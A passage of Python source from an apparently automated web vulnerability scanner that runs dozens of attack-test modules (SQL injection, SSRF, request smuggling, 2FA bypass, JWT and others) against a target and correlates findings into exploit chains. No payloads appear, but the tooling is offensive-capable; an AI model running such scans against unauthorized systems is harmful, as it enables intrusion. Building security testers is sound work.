            _flat_for_chains = []
            for _attr in [
                "idor_findings", "race_findings", "bypass_findings",
                "graphql_findings", "browser_findings", "smuggling_findings",
                "business_logic_findings", "jwt_findings", "nosql_findings",
                "ssti_findings", "deserialization_findings", "ldap_findings",
                "saml_findings", "prototype_pollution_findings", "grpc_findings",
                "sqli_findings", "ssrf_findings", "path_traversal_findings",
                "cors_findings", "xxe_findings", "subdomain_takeover_findings",
                "hpp_findings", "client_side_findings", "oauth_leak_findings",
                "pdf_ssrf_findings", "unicode_norm_findings", "redis_injection_findings",
                "rate_limiting_findings", "cache_poisoning_findings", "dns_rebinding_findings",
                "mass_assignment_findings", "cache_deception_findings",
                "h2c_findings", "http2_attack_findings", "dns_security_findings",
            ]:
                for _f in getattr(result, _attr, []):
                    _flat_for_chains.append(_f.to_dict() if hasattr(_f, "to_dict") else _f)

            # Chain suggestions
            _chain_result = _ics(_flat_for_chains)
            _chain_findings = _chain_result.get("suggestions", [])
            if _chain_findings:
                for _cf in _chain_findings:
                    result.validated_chains.append({
                        "source": "chain_suggestion",
                        "chain_name": _cf.get("chain_name", ""),
                        "severity": _cf.get("severity", "medium"),
                        "confidence": _cf.get("confidence", 0.7),
                        "missing_vuln_types": _cf.get("missing_vuln_types", []),
                        "exploitation_impact": _cf.get("exploitation_impact", ""),
                    })
                log.info(
                    "advanced_integrations: %d chain suggestions for %s",
                    len(_chain_findings), self.target,
                )

            # Payload mutation findings
            _mutation_result = await _ipm(self.target)
            _mutation_findings = _mutation_result.get("mutation_findings", [])
            if _mutation_findings:
                for _mf in _mutation_findings:
                    if isinstance(_mf, dict):
                        _mf.setdefault("source_type", "mutation")
                        _mf.setdefault("confidence", 0.65)
                        result.validated_chains.append(_mf)
                log.info(
                    "advanced_integrations: %d mutation findings for %s",
                    len(_mutation_findings), self.target,
                )
        except Exception as _ai_exc:
            log.debug("advanced_integrations pass failed (non-fatal): %s", _ai_exc)

        # ── Phase 4: ExploitChainEngine (attack_graph_core) — Neo4j chain storage ──
        try:
            from oneinfinity.attack_graph_core.exploit_chain_engine import (
                ExploitChainEngine as GraphExploitChainEngine,
            )
            from oneinfinity.attack_graph_core.graph_engine import get_engine, NodeType

            graph_engine = get_engine()
            # Register each finding as a vulnerability node so the chain engine can match
            for fnd in all_findings_flat:
                vuln_type = str(fnd.get("vuln_type") or fnd.get("category") or "unknown")
                url = str(fnd.get("url") or self.target)
                severity = str(fnd.get("severity") or "info")
                try:
                    graph_engine.add_vulnerability(
                        vuln_type=vuln_type,
                        host=url,
                        endpoint=url,
                        severity=severity,
                        source_engine="unified_advanced_scanner",
                        properties={
                            "evidence": str(fnd.get("evidence") or ""),
                            "source_tool": str(fnd.get("source_tool") or "unified"),
                        },
                    )
                except Exception:
                    pass

            graph_chain_engine = GraphExploitChainEngine(engine=graph_engine)
            graph_chains = graph_chain_engine.detect_chains(target=self.target)
            if graph_chains:
                graph_chain_engine.add_chains_to_graph(graph_chains)
                log.info(
                    "attack_graph_core ExploitChainEngine: %d chains stored in graph/Neo4j",
                    len(graph_chains),
                )
        except Exception as _e:
            log.debug("attack_graph_core chain storage skipped: %s", _e)

        # ── Write output JSON ─────────────────────────────────────────────────
        if output_json_path:
            import json as _json
            import pathlib as _pathlib
            try:
                _pathlib.Path(output_json_path).parent.mkdir(parents=True, exist_ok=True)
                with open(output_json_path, "w", encoding="utf-8") as _fh:
                    _json.dump(
                        {
                            **result.to_dict(),
                            "exploit_chains": [
                                c.to_dict() if hasattr(c, "to_dict") else vars(c)
                                for c in graph_chains
                            ] if "graph_chains" in dir() else [],
                        },
                        _fh,
                        indent=2,
                        default=str,
                    )
                log.info("Scan results written to %s", output_json_path)
            except Exception as _we:
                log.warning("Failed to write output JSON: %s", _we)

        log.info(f"Unified scan complete: {result.total_findings} findings, "
                f"{len(result.attack_chains)} attack chains, risk={result.risk_score:.1f}/10")

        return result

    # ── Module Runners ────────────────────────────────────────────────────────

    async def _run_idor_testing(
        self,
        account_configs: List[Dict],
        source_filter: Optional[str],
    ) -> Tuple[str, List[IDORFinding]]:
        """Run IDOR testing module"""
        log.info("Running multi-account IDOR testing...")

        engine = get_multi_account_idor_engine(self.target)
        engine.load_accounts(account_configs)

        findings = await engine.test_all_captured_traffic(
            source_filter=source_filter,
            limit=500,
        )

        log.info(f"IDOR testing complete: {len(findings)} findings")
        return ('idor', findings)

    async def _run_race_testing(
        self,
        source_filter: Optional[str],
    ) -> Tuple[str, List[RaceFinding]]:
        """Run race condition testing module"""
        log.info("Running race condition testing...")

        findings = await race_condition_engine.test_captured_traffic(
            source_filter=source_filter,
            limit=100,
            concurrency=20,
        )

        log.info(f"Race condition testing complete: {len(findings)} findings")
        return ('race', findings)

    async def _run_bypass_testing(self) -> Tuple[str, List[BypassFinding]]:
        """Run CAPTCHA/2FA bypass testing module"""
        log.info("Running CAPTCHA/2FA bypass testing...")

        findings = await captcha_bypass_engine.scan_captured_traffic(limit=100)

        log.info(f"Bypass testing complete: {len(findings)} findings")
        return ('bypass', findings)

    async def _run_graphql_testing(self) -> Tuple[str, List[Dict]]:
        """Run GraphQL security testing module"""
        log.info("Running GraphQL security testing...")

        try:
            from oneinfinity.scan.graphql_scan_engine import GraphQLScanEngine
        except ImportError:
            log.warning("GraphQL scanner not available")
            return ('graphql', [])

        try:
            scanner = GraphQLScanEngine(self.target)
            findings = await scanner.run()
            log.info(f"GraphQL testing complete: {len(findings)} findings")
            return ('graphql', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"GraphQL testing failed: {e}")
            return ('graphql', [])

    async def _run_browser_testing(self) -> Tuple[str, List[Dict]]:
        """Run headless browser analysis module"""
        log.info("Running browser analysis...")

        try:
            from oneinfinity.scan.headless_browser_engine import HeadlessBrowserEngine
        except ImportError:
            log.warning("Browser engine not available")
            return ('browser', [])

        try:
            engine = HeadlessBrowserEngine(target=self.target)
            # run() is sync and returns dict with 'findings' key
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, engine.run)
            findings = result.get('findings', [])
            log.info(f"Browser analysis complete: {len(findings)} findings")
            return ('browser', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Browser analysis failed: {e}")
            return ('browser', [])

    async def _run_smuggling_testing(self) -> Tuple[str, List[Dict]]:
        """Run HTTP request smuggling detection module"""
        log.info("Running request smuggling detection...")

        try:
            from oneinfinity.scan.smuggling_engine import SmugglingEngine
        except ImportError:
            log.warning("Smuggling engine not available")
            return ('smuggling', [])

        try:
            engine = SmugglingEngine(target=self.target)
            # run() is sync, wrap in executor
            loop = asyncio.get_event_loop()
            findings = await loop.run_in_executor(None, engine.run)
            log.info(f"Smuggling detection complete: {len(findings)} findings")
            return ('smuggling', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Smuggling detection failed: {e}")
            return ('smuggling', [])

    async def _run_business_logic_testing(self) -> Tuple[str, List[Dict]]:
        """Run LLM-powered business logic analysis"""
        log.info("Running business logic analysis...")

        try:
            from oneinfinity.scan.llm_business_logic_analyzer import LLMBusinessLogicAnalyzer
        except ImportError:
            log.warning("LLM business logic analyzer not available")
            return ('business_logic', [])

        try:
            analyzer = LLMBusinessLogicAnalyzer()
            result = await analyzer.analyze(self.target, traffic_limit=500)
            findings = [v.to_dict() for v in result.vulnerabilities]
            log.info(f"Business logic analysis complete: {len(findings)} findings")
            return ('business_logic', findings)
        except Exception as e:
            log.error(f"Business logic analysis failed: {e}")
            return ('business_logic', [])

    # ── P0-P2 Scanner Module Runners ──────────────────────────────────────────

    async def _run_jwt_testing(self) -> Tuple[str, List[Dict]]:
        """Run JWT vulnerability testing"""
        log.info("Running JWT vulnerability testing...")

        try:
            from oneinfinity.scan.jwt_vulnerability_scanner import scan_jwt_vulnerabilities
        except ImportError:
            log.warning("JWT scanner not available")
            return ('jwt', [])

        try:
            findings = await scan_jwt_vulnerabilities(self.target, traffic_limit=500)
            log.info(f"JWT testing complete: {len(findings)} findings")
            return ('jwt', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"JWT testing failed: {e}")
            return ('jwt', [])

    async def _run_nosql_testing(self) -> Tuple[str, List[Dict]]:
        """Run NoSQL injection testing"""
        log.info("Running NoSQL injection testing...")

        try:
            from oneinfinity.scan.nosql_injection_scanner import scan_nosql_injection
        except ImportError:
            log.warning("NoSQL scanner not available")
            return ('nosql', [])

        try:
            findings = await scan_nosql_injection(self.target, traffic_limit=500)
            log.info(f"NoSQL testing complete: {len(findings)} findings")
            return ('nosql', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"NoSQL testing failed: {e}")
            return ('nosql', [])

    async def _run_ssti_testing(self) -> Tuple[str, List[Dict]]:
        """Run SSTI testing"""
        log.info("Running SSTI testing...")

        try:
            from oneinfinity.scan.ssti_scanner import scan_ssti
        except ImportError:
            log.warning("SSTI scanner not available")
            return ('ssti', [])

        try:
            findings = await scan_ssti(self.target, traffic_limit=500)
            log.info(f"SSTI testing complete: {len(findings)} findings")
            return ('ssti', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"SSTI testing failed: {e}")
            return ('ssti', [])

    async def _run_deserialization_testing(self) -> Tuple[str, List[Dict]]:
        """Run deserialization vulnerability testing"""
        log.info("Running deserialization testing...")

        try:
            from oneinfinity.scan.enhanced_scanners import scan_deserialization
        except ImportError:
            log.warning("Deserialization scanner not available")
            return ('deserialization', [])

        try:
            findings = await scan_deserialization(self.target)
            log.info(f"Deserialization testing complete: {len(findings)} findings")
            return ('deserialization', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Deserialization testing failed: {e}")
            return ('deserialization', [])

    async def _run_ldap_testing(self) -> Tuple[str, List[Dict]]:
        """Run LDAP injection testing"""
        log.info("Running LDAP injection testing...")

        try:
            from oneinfinity.scan.enhanced_scanners import scan_ldap_injection
        except ImportError:
            log.warning("LDAP scanner not available")
            return ('ldap', [])

        try:
            findings = await scan_ldap_injection(self.target)
            log.info(f"LDAP testing complete: {len(findings)} findings")
            return ('ldap', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"LDAP testing failed: {e}")
            return ('ldap', [])

    async def _run_saml_testing(self) -> Tuple[str, List[Dict]]:
        """Run SAML vulnerability testing"""
        log.info("Running SAML testing...")

        try:
            from oneinfinity.scan.enhanced_scanners import scan_saml
        except ImportError:
            log.warning("SAML scanner not available")
            return ('saml', [])

        try:
            findings = await scan_saml(self.target)
            log.info(f"SAML testing complete: {len(findings)} findings")
            return ('saml', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"SAML testing failed: {e}")
            return ('saml', [])

    async def _run_prototype_pollution_testing(self) -> Tuple[str, List[Dict]]:
        """Run prototype pollution testing"""
        log.info("Running prototype pollution testing...")

        try:
            from oneinfinity.scan.enhanced_scanners import scan_prototype_pollution
        except ImportError:
            log.warning("Prototype pollution scanner not available")
            return ('prototype_pollution', [])

        try:
            findings = await scan_prototype_pollution(self.target)
            log.info(f"Prototype pollution testing complete: {len(findings)} findings")
            return ('prototype_pollution', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Prototype pollution testing failed: {e}")
            return ('prototype_pollution', [])

    async def _run_grpc_testing(self) -> Tuple[str, List[Dict]]:
        """Run gRPC vulnerability testing via grpc_scanner.py"""
        log.info("Running gRPC testing...")

        try:
            from oneinfinity.scan.grpc_scanner import scan_grpc as _scan_grpc_native
        except ImportError:
            log.warning("gRPC scanner not available")
            return ('grpc', [])

        try:
            loop = asyncio.get_event_loop()
            findings = await loop.run_in_executor(
                None, _scan_grpc_native, self.target
            )
            normalized = [
                {
                    "vuln_type": f.vuln_type if hasattr(f, "vuln_type") else f.get("vuln_type", "grpc"),
                    "severity": f.severity if hasattr(f, "severity") else f.get("severity", "info"),
                    "url": f.url if hasattr(f, "url") else f.get("url", self.target),
                    "evidence": f.evidence if hasattr(f, "evidence") else f.get("evidence", ""),
                    "source_tool": "grpc_scanner",
                    **(f.to_dict() if hasattr(f, "to_dict") else f if isinstance(f, dict) else {}),
                }
                for f in (findings or [])
            ]
            log.info(f"gRPC testing complete: {len(normalized)} findings")
            return ('grpc', normalized)
        except Exception as e:
            log.error(f"gRPC testing failed: {e}")
            return ('grpc', [])
    # ── P0 Critical Scanner Module Runners ────────────────────────────────────

    async def _run_sqli_testing(self) -> Tuple[str, List[Dict]]:
        """Run SQL injection testing"""
        log.info("Running SQL injection testing...")

        try:
            from oneinfinity.scan.sqli_scanner import scan_sqli
        except ImportError:
            log.warning("SQLi scanner not available")
            return ('sqli', [])

        try:
            findings = await scan_sqli(self.target, traffic_limit=500)
            log.info(f"SQLi testing complete: {len(findings)} findings")
            return ('sqli', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"SQLi testing failed: {e}")
            return ('sqli', [])

    async def _run_ssrf_testing(self, oob_domain: Optional[str]) -> Tuple[str, List[Dict]]:
        """Run SSRF testing"""
        log.info("Running SSRF testing...")

        try:
            from oneinfinity.scan.ssrf_scanner import scan_ssrf
        except ImportError:
            log.warning("SSRF scanner not available")
            return ('ssrf', [])

        try:
            findings = await scan_ssrf(self.target, traffic_limit=500, oob_domain=oob_domain)
            log.info(f"SSRF testing complete: {len(findings)} findings")
            return ('ssrf', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"SSRF testing failed: {e}")
            return ('ssrf', [])

    async def _run_path_traversal_testing(self) -> Tuple[str, List[Dict]]:
        """Run path traversal testing"""
        log.info("Running path traversal testing...")

        try:
            from oneinfinity.scan.path_traversal_scanner import scan_path_traversal
        except ImportError:
            log.warning("Path traversal scanner not available")
            return ('path_traversal', [])

        try:
            findings = await scan_path_traversal(self.target, traffic_limit=500)
            log.info(f"Path traversal testing complete: {len(findings)} findings")
            return ('path_traversal', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Path traversal testing failed: {e}")
            return ('path_traversal', [])

    async def _run_cors_testing(self) -> Tuple[str, List[Dict]]:
        """Run CORS misconfiguration testing"""
        log.info("Running CORS testing...")

        try:
            from oneinfinity.scan.cors_scanner import scan_cors
        except ImportError:
            log.warning("CORS scanner not available")
            return ('cors', [])

        try:
            findings = await scan_cors(self.target, traffic_limit=500)
            log.info(f"CORS testing complete: {len(findings)} findings")
            return ('cors', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"CORS testing failed: {e}")
            return ('cors', [])

    async def _run_xxe_testing(self) -> Tuple[str, List[Dict]]:
        """Run XXE testing"""
        log.info("Running XXE testing...")

        try:
            from oneinfinity.scan.xxe_scanner import scan_xxe
        except ImportError:
            log.warning("XXE scanner not available")
            return ('xxe', [])

        try:
            findings = await scan_xxe(self.target, traffic_limit=500)
            log.info(f"XXE testing complete: {len(findings)} findings")
            return ('xxe', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"XXE testing failed: {e}")
            return ('xxe', [])

    async def _run_subdomain_takeover_testing(self) -> Tuple[str, List[Dict]]:
        """Run subdomain takeover testing"""
        log.info("Running subdomain takeover testing...")

        try:
            from oneinfinity.scan.subdomain_takeover_scanner import scan_subdomain_takeover
        except ImportError:
            log.warning("Subdomain takeover scanner not available")
            return ('subdomain_takeover', [])

        try:
            findings = await scan_subdomain_takeover(self.target)
            log.info(f"Subdomain takeover testing complete: {len(findings)} findings")
            return ('subdomain_takeover', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Subdomain takeover testing failed: {e}")
            return ('subdomain_takeover', [])

    async def _run_hpp_testing(self) -> Tuple[str, List[Dict]]:
        """Run HTTP Parameter Pollution testing"""
        log.info("Running HPP testing...")

        try:
            from oneinfinity.scan.hpp_scanner import scan_hpp
        except ImportError:
            log.warning("HPP scanner not available")
            return ('hpp', [])

        try:
            findings = await scan_hpp(self.target, traffic_limit=500)
            log.info(f"HPP testing complete: {len(findings)} findings")
            return ('hpp', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"HPP testing failed: {e}")
            return ('hpp', [])

    async def _run_client_side_testing(self) -> Tuple[str, List[Dict]]:
        """Run client-side attack testing"""
        log.info("Running client-side attack testing...")

        try:
            from oneinfinity.scan.client_side_attack_scanner import scan_client_side_attacks
        except ImportError:
            log.warning("Client-side attack scanner not available")
            return ('client_side', [])

        try:
            findings = await scan_client_side_attacks(self.target)
            log.info(f"Client-side testing complete: {len(findings)} findings")
            return ('client_side', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Client-side testing failed: {e}")
            return ('client_side', [])

    async def _run_oauth_leak_testing(self) -> Tuple[str, List[Dict]]:
        """Run OAuth token leak testing"""
        log.info("Running OAuth token leak testing...")

        try:
            from oneinfinity.scan.oauth_token_leak_scanner import scan_oauth_leaks
        except ImportError:
            log.warning("OAuth leak scanner not available")
            return ('oauth_leak', [])

        try:
            findings = await scan_oauth_leaks(self.target, traffic_limit=500)
            log.info(f"OAuth leak testing complete: {len(findings)} findings")
            return ('oauth_leak', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"OAuth leak testing failed: {e}")
            return ('oauth_leak', [])

    async def _run_pdf_ssrf_testing(self) -> Tuple[str, List[Dict]]:
        """Run PDF generation SSRF testing"""
        log.info("Running PDF SSRF testing...")

        try:
            from oneinfinity.scan.advanced_attack_scanners import scan_pdf_generation_ssrf
        except ImportError:
            log.warning("PDF SSRF scanner not available")
            return ('pdf_ssrf', [])

        try:
            findings = await scan_pdf_generation_ssrf(self.target)
            log.info(f"PDF SSRF testing complete: {len(findings)} findings")
            return ('pdf_ssrf', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"PDF SSRF testing failed: {e}")
            return ('pdf_ssrf', [])

    async def _run_unicode_norm_testing(self) -> Tuple[str, List[Dict]]:
        """Run Unicode normalization testing"""
        log.info("Running Unicode normalization testing...")

        try:
            from oneinfinity.scan.advanced_attack_scanners import scan_unicode_normalization
        except ImportError:
            log.warning("Unicode normalization scanner not available")
            return ('unicode_norm', [])

        try:
            findings = await scan_unicode_normalization(self.target)
            log.info(f"Unicode normalization testing complete: {len(findings)} findings")
            return ('unicode_norm', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Unicode normalization testing failed: {e}")
            return ('unicode_norm', [])

    async def _run_redis_injection_testing(self) -> Tuple[str, List[Dict]]:
        """Run Redis injection testing"""
        log.info("Running Redis injection testing...")

        try:
            from oneinfinity.scan.advanced_attack_scanners import scan_redis_injection
        except ImportError:
            log.warning("Redis injection scanner not available")
            return ('redis_injection', [])

        try:
            findings = await scan_redis_injection(self.target)
            log.info(f"Redis injection testing complete: {len(findings)} findings")
            return ('redis_injection', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Redis injection testing failed: {e}")
            return ('redis_injection', [])

    async def _run_rate_limiting_testing(self) -> Tuple[str, List[Dict]]:
        """Run rate limiting testing"""
        log.info("Running rate limiting testing...")

        try:
            from oneinfinity.scan.advanced_attack_scanners import scan_rate_limiting
        except ImportError:
            log.warning("Rate limiting scanner not available")
            return ('rate_limiting', [])

        try:
            findings = await scan_rate_limiting(self.target)
            log.info(f"Rate limiting testing complete: {len(findings)} findings")
            return ('rate_limiting', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Rate limiting testing failed: {e}")
            return ('rate_limiting', [])

    async def _run_cache_poisoning_testing(self) -> Tuple[str, List[Dict]]:
        """Run cache poisoning testing"""
        log.info("Running cache poisoning testing...")

        try:
            from oneinfinity.scan.advanced_attack_scanners import scan_cache_poisoning
        except ImportError:
            log.warning("Cache poisoning scanner not available")
            return ('cache_poisoning', [])

        try:
            findings = await scan_cache_poisoning(self.target)
            log.info(f"Cache poisoning testing complete: {len(findings)} findings")
            return ('cache_poisoning', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"Cache poisoning testing failed: {e}")
            return ('cache_poisoning', [])

    async def _run_dns_rebinding_testing(self) -> Tuple[str, List[Dict]]:
        """Run DNS rebinding testing"""
        log.info("Running DNS rebinding testing...")

        try:
            from oneinfinity.scan.dns_rebinding_scanner import scan_dns_rebinding
        except ImportError:
            log.warning("DNS rebinding scanner not available")
            return ('dns_rebinding', [])

        try:
            findings = await scan_dns_rebinding(self.target)
            log.info(f"DNS rebinding testing complete: {len(findings)} findings")
            return ('dns_rebinding', [f.to_dict() if hasattr(f, 'to_dict') else f for f in findings])
        except Exception as e:
            log.error(f"DNS rebinding testing failed: {e}")
            return ('dns_rebinding', [])


    # ── Phase 4 Scanner Module Runners ───────────────────────────────────────

    async def _run_mass_assignment_testing(self) -> Tuple[str, List[Dict]]:
        """Run mass assignment / BOLA vulnerability testing"""
        log.info("Running mass assignment testing...")

        try:
            from oneinfinity.scan.mass_assignment_scanner import MassAssignmentScanner
        except ImportError:
            log.warning("Mass assignment scanner not available")
            return ('mass_assignment', [])

        try:
            scanner = MassAssignmentScanner()
            findings = await scanner.scan(self.target)
            normalized = [
                {
                    "vuln_type": f.get("vuln_type", "mass_assignment"),
                    "severity": f.get("severity", "high"),
                    "url": f.get("url", self.target),
                    "evidence": f.get("evidence", f.get("description", "")),
                    "source_tool": "mass_assignment_scanner",
                    **f,
                }
                for f in (findings or [])
            ]
            log.info(f"Mass assignment testing complete: {len(normalized)} findings")
            return ('mass_assignment', normalized)
        except Exception as e:
            log.error(f"Mass assignment testing failed: {e}")
            return ('mass_assignment', [])

    async def _run_cache_deception_testing(self) -> Tuple[str, List[Dict]]:
        """Run web cache deception testing"""
        log.info("Running cache deception testing...")

        try:
            from oneinfinity.scan.cache_deception_scanner import get_scanner as _get_cds
        except ImportError:
            log.warning("Cache deception scanner not available")
            return ('cache_deception', [])

        try:
            scanner = _get_cds()
            findings = await scanner.scan(self.target, endpoints=[])
            await scanner.close()
            normalized = [
                {
                    "vuln_type": f.vuln_type if hasattr(f, "vuln_type") else f.get("vuln_type", "cache_deception"),
                    "severity": f.severity if hasattr(f, "severity") else f.get("severity", "high"),
                    "url": f.url if hasattr(f, "url") else f.get("url", self.target),
                    "evidence": f.evidence if hasattr(f, "evidence") else f.get("evidence", ""),
                    "source_tool": "cache_deception_scanner",
                    **(f.to_dict() if hasattr(f, "to_dict") else f if isinstance(f, dict) else {}),
                }
                for f in (findings or [])
            ]
            log.info(f"Cache deception testing complete: {len(normalized)} findings")
            return ('cache_deception', normalized)
        except Exception as e:
            log.error(f"Cache deception testing failed: {e}")
            return ('cache_deception', [])

    async def _run_h2c_testing(self) -> Tuple[str, List[Dict]]:
        """Run HTTP/2 cleartext (h2c) upgrade smuggling testing"""
        log.info("Running H2C testing...")

        try:
            from oneinfinity.scan.h2c_scanner import scan_h2c as _scan_h2c
        except ImportError:
            log.warning("H2C scanner not available")
            return ('h2c', [])

        try:
            loop = asyncio.get_event_loop()
            findings = await loop.run_in_executor(None, _scan_h2c, self.target)
            normalized = [
                {
                    "vuln_type": f.get("vuln_type", "h2c_upgrade_smuggling"),
                    "severity": f.get("severity", "high"),
                    "url": f.get("url", self.target),
                    "evidence": f.get("evidence", f.get("title", "")),
                    "source_tool": "h2c_scanner",
                    **f,
                }
                for f in (findings or [])
            ]
            log.info(f"H2C testing complete: {len(normalized)} findings")
            return ('h2c', normalized)
        except Exception as e:
            log.error(f"H2C testing failed: {e}")
            return ('h2c', [])

    async def _run_http2_testing(self) -> Tuple[str, List[Dict]]:
        """Run HTTP/2 protocol-level attack testing"""
        log.info("Running HTTP/2 attack testing...")

        try:
            from oneinfinity.scan.http2_attack_engine import scan_http2 as _scan_http2
        except ImportError:
            log.warning("HTTP/2 attack engine not available")
            return ('http2_attack', [])

        try:
            findings = await _scan_http2(self.target)
            normalized = [
                {
                    "vuln_type": f.get("vuln_type", "http2_attack"),
                    "severity": f.get("severity", "high"),
                    "url": f.get("url", self.target),
                    "evidence": f.get("evidence", f.get("title", "")),
                    "source_tool": "http2_attack_engine",
                    **f,
                }
                for f in (findings or [])
            ]
            log.info(f"HTTP/2 attack testing complete: {len(normalized)} findings")
            return ('http2_attack', normalized)
        except Exception as e:
            log.error(f"HTTP/2 attack testing failed: {e}")
            return ('http2_attack', [])

    async def _run_dns_security_testing(self) -> Tuple[str, List[Dict]]:
        """Run DNS security scanning (DNSSEC, zone transfer, cache poisoning)"""
        log.info("Running DNS security testing...")

        try:
            from oneinfinity.scan.dns_security_scanner import scan_dns_security as _scan_dns_security
        except ImportError:
            log.warning("DNS security scanner not available")
            return ('dns_security', [])

        try:
            # Extract base domain from target URL for DNS queries
            import urllib.parse as _urlparse
            _parsed = _urlparse.urlparse(self.target)
            domain = _parsed.hostname or self.target.rstrip("/")
            findings = await _scan_dns_security(domain)
            normalized = [
                {
                    "vuln_type": f.get("vuln_type", "dns_security"),
                    "severity": f.get("severity", "medium"),
                    "url": f.get("url", f.get("domain", self.target)),
                    "evidence": f.get("evidence", f.get("title", "")),
                    "source_tool": "dns_security_scanner",
                    **f,
                }
                for f in (findings or [])
            ]
            log.info(f"DNS security testing complete: {len(normalized)} findings")
            return ('dns_security', normalized)
        except Exception as e:
            log.error(f"DNS security testing failed: {e}")
            return ('dns_security', [])

    async def _run_chain_validation(
        self,
        result: AdvancedScanResult,
        oob_domain: Optional[str]
    ) -> List[Dict]:
        log.info("Running chain validation...")

        validated = []

        try:
            from oneinfinity.scan.chain_validator import get_chain_validator
        except ImportError:
            log.warning("Chain validator not available")
            return []

        validator = get_chain_validator()

        # Collect all findings for validation
        all_findings = []
        for finding in result.idor_findings:
            all_findings.append(finding.to_dict())
        for finding in result.race_findings:
            all_findings.append(finding.to_dict())
        for finding in result.bypass_findings:
            all_findings.append(finding.to_dict())
        all_findings.extend(result.graphql_findings)
        all_findings.extend(result.browser_findings)
        all_findings.extend(result.smuggling_findings)
        all_findings.extend(result.business_logic_findings)
        all_findings.extend(result.jwt_findings)
        all_findings.extend(result.nosql_findings)
        all_findings.extend(result.ssti_findings)
        all_findings.extend(result.deserialization_findings)
        all_findings.extend(result.ldap_findings)
        all_findings.extend(result.saml_findings)
        all_findings.extend(result.prototype_pollution_findings)
        all_findings.extend(result.grpc_findings)
        all_findings.extend(result.sqli_findings)
        all_findings.extend(result.ssrf_findings)
        all_findings.extend(result.path_traversal_findings)
        all_findings.extend(result.cors_findings)
        all_findings.extend(result.xxe_findings)
        all_findings.extend(result.subdomain_takeover_findings)
        all_findings.extend(result.hpp_findings)
        all_findings.extend(result.client_side_findings)
        all_findings.extend(result.oauth_leak_findings)
        all_findings.extend(result.pdf_ssrf_findings)
        all_findings.extend(result.unicode_norm_findings)
        all_findings.extend(result.redis_injection_findings)
        all_findings.extend(result.rate_limiting_findings)
        all_findings.extend(result.cache_poisoning_findings)
        all_findings.extend(result.dns_rebinding_findings)

        # Validate each finding
        for finding in all_findings:
            try:
                vuln_type = finding.get('vuln_type', '')
                url = finding.get('url', '')
                param_name = finding.get('parameter', '') or finding.get('param_name', '')
                payload = finding.get('payload', '')

                if not url:
                    continue

                # Run validation
                validation_result = await validator.validate_chain(
                    vuln_type=vuln_type,
                    url=url,
                    param_name=param_name,
                    payload=payload,
                    oob_domain=oob_domain
                )

                if validation_result and validation_result.validated:
                    # Add secondary vuln_type to finding
                    validated_finding = finding.copy()
                    validated_finding['secondary_vuln_type'] = validation_result.secondary_vuln_type
                    validated_finding['chain_validated'] = True
                    validated_finding['validation_evidence'] = validation_result.evidence
                    validated_finding['validation_confidence'] = validation_result.confidence
                    validated.append(validated_finding)

                    log.info(f"Chain validated: {vuln_type} → {validation_result.secondary_vuln_type}")

            except Exception as e:
                log.debug(f"Chain validation failed for {finding.get('vuln_type')}: {e}")
                continue

        await validator.close()
        log.info(f"Chain validation complete: {len(validated)}/{len(all_findings)} chains validated")
        return validated

    # ── Attack Chain Detection ───────────────────────────────────────────────

    def _detect_attack_chains(self, result: AdvancedScanResult) -> List[AttackChain]:
        """
        Detect attack chains by correlating findings across modules.

        Innovation: Automatic chain synthesis using pattern matching with type normalization.
        """
        chains = []

        # Build vulnerability index with normalized types
        vuln_types = set()
        vuln_index = {}

        for finding in result.idor_findings:
            vuln_type = finding.idor_type or 'idor'
            # Normalize and add all aliases
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding.to_dict())

        for finding in result.race_findings:
            vuln_type = finding.race_type or 'race_condition'
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding.to_dict())

        for finding in result.bypass_findings:
            vuln_type = finding.vuln_type
            normalized_types = _normalize_vuln_type(vuln_type)
            vuln_types.update(normalized_types)
            for norm_type in normalized_types:
                if norm_type not in vuln_index:
                    vuln_index[norm_type] = []
                vuln_index[norm_type].append(finding.to_dict())

        # NEW: Index GraphQL, browser, smuggling, business logic findings
        for finding in result.graphql_findings:
            vuln_type = finding.get('vuln_type', 'graphql')
            normalized_types = _normalize_vuln_type(vuln_type)
